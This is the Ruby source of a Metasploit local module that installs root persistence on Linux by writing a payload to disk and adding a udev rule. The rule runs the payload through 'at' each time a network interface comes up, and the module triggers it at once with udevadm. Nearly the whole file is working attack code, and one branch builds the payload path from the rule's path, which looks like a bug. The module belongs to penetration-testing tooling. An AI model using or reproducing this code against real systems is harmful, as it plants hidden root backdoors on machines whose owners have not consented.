##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local

  Rank = GreatRanking

  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Exploit::Local::Persistence
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Deprecated
  moved_from 'exploits/linux/local/udev_persistence'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'udev Persistence',
        'Description' => %q{
          This module will add a script in /lib/udev/rules.d/ in order to execute a payload written on disk.
          It'll be executed with root privileges everytime a network interface other than l0 comes up.
          Execution is triggered through at command, so it must be installed on the target.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Julien Voisin'
        ],
        'Platform' => [ 'unix', 'linux' ],
        'Arch' => [
          ARCH_CMD,
          ARCH_X86,
          ARCH_X64,
          ARCH_ARMLE,
          ARCH_AARCH64,
          ARCH_PPC,
          ARCH_MIPSLE,
          ARCH_MIPSBE
        ],
        'Payload' => {
          'BadChars' => '\n"'
        },
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Targets' => [ ['Automatic', {}] ],
        'DefaultTarget' => 0,
        'Privileged' => true,
        'DisclosureDate' => '2003-11-01', # udev release date
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION, EVENT_DEPENDENT],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        },
        'References' => [
          ['URL', 'https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp'],
          ['URL', 'https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-for-persistence/'],
          ['ATT&CK', Mitre::Attack::Technique::T1546_EVENT_TRIGGERED_EXECUTION],
          ['ATT&CK', Mitre::Attack::Technique::T1546_017_UDEV_RULES]
        ]
      )
    )
    register_options([
      OptString.new('PAYLOAD_NAME', [false, 'Name of the payload file to write']),
      OptString.new('UDEV_PATH', [false, 'Path to udev', '/lib/udev/rules.d/']),
      OptString.new('UDEV_RULE', [false, 'Rule name for udev. Defaults to random']),
    ])
  end

  def check
    print_warning('Payloads in /tmp will only last until reboot, you want to choose elsewhere.') if writable_dir.start_with?('/tmp')
    return CheckCode::Safe("#{writable_dir} doesnt exist") unless exists?(writable_dir)
    return CheckCode::Safe("#{writable_dir} isnt writable") unless writable?(writable_dir)
    return CheckCode::Safe("#{datastore['UDEV_PATH']} doesnt exist") unless exists?(datastore['UDEV_PATH'])
    return CheckCode::Safe("#{datastore['UDEV_PATH']} isnt writable") unless writable?(datastore['UDEV_PATH'])

    return CheckCode::Safe('at commmand not found') if get_at_command('').nil?

    CheckCode::Appears('likely exploitable')
  end

  def get_at_command(payload_path)
    return nil unless executable? '/usr/bin/at'

    %(/usr/bin/at -M -f #{payload_path} now)
  end

  def install_persistence
    udev_rule = datastore['UDEV_RULE'].blank? ? %(#{Rex::Text.rand_text_numeric(2)}-#{Rex::Text.rand_text_alphanumeric(8)}.rules) : datastore['UDEV_RULE']
    backdoor_path = "#{datastore['UDEV_PATH']}/#{udev_rule}"
    payload_path = "#{writable_dir}/#{(datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alphanumeric(5..10))}"

    if exists? backdoor_path
      fail_with Failure::BadConfig, "#{backdoor_path} is already present"
    end

    if payload.arch.first == 'cmd'
      upload_and_chmodx(payload_path, "#!/bin/sh\n#{payload.encoded}")
    else
      payload_path = writable_dir
      payload_path = payload_path.end_with?('/') ? backdoor_path : "#{backdoor_path}/"
      payload_name = datastore['PAYLOAD_NAME'] || rand_text_alphanumeric(5..10)
      payload_path << payload_name
      print_status("Uploading payload file to #{payload_path}")
      upload_and_chmodx payload_path, generate_payload_exe
    end
    @clean_up_rc << "rm #{payload_path}\n"

    print_good "#{payload_path} written"

    fail_with(Failure::PayloadFailed, 'Failed to write UDEV file') unless write_file(backdoor_path, %(SUBSYSTEM=="net", KERNEL!="lo", RUN+="#{get_at_command(payload_path)}"))
    @clean_up_rc << "rm #{backdoor_path}\n"

    print_good "#{backdoor_path} written"

    # need to trigger first rule manually
    print_status 'Triggering udev rule'
    cmd_exec('udevadm trigger -v --subsystem-match=net')
  end
end
